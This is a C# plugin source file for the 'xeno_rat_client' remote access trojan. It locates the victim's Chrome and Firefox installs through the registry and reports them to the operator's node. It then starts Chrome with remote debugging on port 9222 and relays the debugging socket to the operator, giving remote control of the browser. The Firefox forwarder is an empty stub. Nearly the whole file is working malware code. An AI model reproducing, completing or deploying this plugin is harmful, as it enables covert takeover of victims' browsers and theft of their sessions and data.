using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Retrieves the file path of the Chrome executable.
        /// </summary>
        /// <returns>The file path of the Chrome executable, or null if not found.</returns>
        /// <remarks>
        /// This method retrieves the file path of the Chrome executable by accessing the Windows Registry key "HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command".
        /// It then extracts the file path from the retrieved string and returns it. If the path is not found or an exception occurs, null is returned.
        /// </remarks>
        public string ChromeExePath() 
        {
            try
            {
                var path = Registry.GetValue("HKEY_CLASSES_ROOT\\ChromeHTML\\shell\\open\\command", null, null) as string;
                if (path != null)
                {
                    var split = path.Split('\"');
                    path = split.Length >= 2 ? split[1] : null;
                }
                return path;
            }
            catch { }
            return null;
        }

        /// <summary>
        /// Retrieves the path to the Firefox executable.
        /// </summary>
        /// <returns>The path to the Firefox executable, or null if it is not found.</returns>
        /// <remarks>
        /// This method searches the Windows Registry for the path to the Firefox executable by looking for the key associated with "FirefoxHTML".
        /// If found, it retrieves the command associated with opening this key, and extracts the path to the Firefox executable from it.
        /// If the path is found, it is returned; otherwise, null is returned.
        /// </remarks>
        public string FirefoxExePath() 
        {
            try
            {
                foreach (string keyname in Registry.ClassesRoot.GetSubKeyNames())
                {
                    if (keyname.Contains("FirefoxHTML"))
                    {
                        var path = Registry.GetValue(string.Format("HKEY_CLASSES_ROOT\\{0}\\shell\\open\\command", keyname), null, null) as string;
                        if (path != null)
                        {
                            var split = path.Split('\"');
                            path = split.Length >= 2 ? split[1] : null;
                        }
                        return path;
                    }
                }
            }
            catch { }
            return null;
        }

        /// <summary>
        /// Receives data from the client and sends a response back using the specified socket.
        /// </summary>
        /// <param name="sock">The socket used for communication.</param>
        /// <param name="client">The client node from which data is received.</param>
        /// <remarks>
        /// This method continuously receives data from the <paramref name="client"/> using the specified <paramref name="sock"/>.
        /// Upon receiving data, it is printed to the console using UTF-8 encoding and then sent back to the client using the same <paramref name="sock"/>.
        /// The method runs in an infinite loop and does not return unless an exception occurs or the program is terminated externally.
        /// </remarks>
        public void recvThread(Socket sock, Node client)
        {
            while (true)
            {
                byte[] data = client.Receive();
                Console.WriteLine(Encoding.UTF8.GetString(data));
                sock.Send(data, data.Length, SocketFlags.None);
            }
        }

        /// <summary>
        /// Listens for incoming data on the specified <paramref name="sock"/> and sends it to the <paramref name="client"/>.
        /// </summary>
        /// <param name="sock">The socket to listen for incoming data.</param>
        /// <param name="client">The node to which the incoming data will be sent.</param>
        /// <remarks>
        /// This method continuously listens for incoming data on the specified <paramref name="sock"/> and sends it to the <paramref name="client"/>.
        /// It uses a while loop to keep the process running indefinitely.
        /// Upon receiving data, it prints the received message to the console using UTF-8 encoding and then sends the same data to the <paramref name="client"/>.
        /// </remarks>
        public void sendThread(Socket sock, Node client)
        {
            while (true)
            {
                byte[] bits = new byte[1];
                sock.Receive(bits, bits.Length, SocketFlags.None);
                Console.WriteLine(Encoding.UTF8.GetString(bits));
                client.Send(bits);
            }
        }

        /// <summary>
        /// Forwards the given node to the specified Firefox path.
        /// </summary>
        /// <param name="node">The node to be forwarded.</param>
        /// <param name="FireFoxPath">The path to the Firefox application.</param>
        public void FirefoxForwarder(Node node,string FireFoxPath) 
        { 
            
        }

        /// <summary>
        /// Opens a new instance of Google Chrome with remote debugging enabled and connects to it using a socket.
        /// </summary>
        /// <param name="node">The node to be connected to the Chrome instance.</param>
        /// <param name="ChromePath">The file path to the Chrome executable.</param>
        /// <remarks>
        /// This method opens a new instance of Google Chrome using the specified <paramref name="ChromePath"/> and sets up remote debugging by providing the user data directory and remote debugging port.
        /// It then connects to the Chrome instance using a socket and starts separate threads for sending and receiving data to and from the Chrome instance.
        /// </remarks>
        public void ChromeForwarder(Node node, string ChromePath) 
        {
            Console.WriteLine(ChromePath);
            Console.WriteLine(ChromePath, "--user-data-dir=C:\\chrome-dev-profile23 --remote-debugging-port=9222");
            Process.Start(ChromePath,"--user-data-dir=C:\\chrome-dev-profile23 --remote-debugging-port=9222");
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Thread.Sleep(5);
            socket.Connect("localhost", 9222);
            Console.WriteLine(socket.Connected);
            new Thread(() => sendThread(socket, node)).Start();
            recvThread(socket, node);
        }

        /// <summary>
        /// Sends a byte array to the specified node, checks for available browsers, and forwards the request to the selected browser.
        /// </summary>
        /// <param name="node">The node to which the byte array will be sent.</param>
        /// <remarks>
        /// This method sends a byte array to the specified node to indicate that it has connected. It then checks for available browsers by retrieving the paths for Chrome and Firefox executables. If available, it sets the corresponding index in the 'avalible_browsers' array to 1; otherwise, it sets it to 0.
        /// After sending the 'avalible_browsers' array to the node, it receives a byte array representing the selected browser. If the value is 1, it forwards the request to Chrome using the 'ChromeForwarder' method; if the value is 2, it forwards the request to Firefox using the 'FirefoxForwarder' method.
        /// </remarks>
        public void Run(Node node)
        {
            node.Send(new byte[] { 3 });//indicate that it has connected
            byte[] avalible_browsers = new byte[2];
            string chrome = ChromeExePath();
            string firefox = FirefoxExePath();
            if (chrome != null)
            {
                avalible_browsers[0] = 1;
            }
            else 
            {
                avalible_browsers[0] = 0;
            }
            if (firefox != null)
            {
                avalible_browsers[1] = 1;
            }
            else 
            {
                avalible_browsers[1] = 0;
            }
            node.Send(avalible_browsers);
            byte[] browser=node.Receive();
            if (browser[0] == 1)
            {
                ChromeForwarder(node, chrome);
            }
            else if (browser[0] == 2) 
            {
                FirefoxForwarder(node, firefox);
            }
        }
    }
}
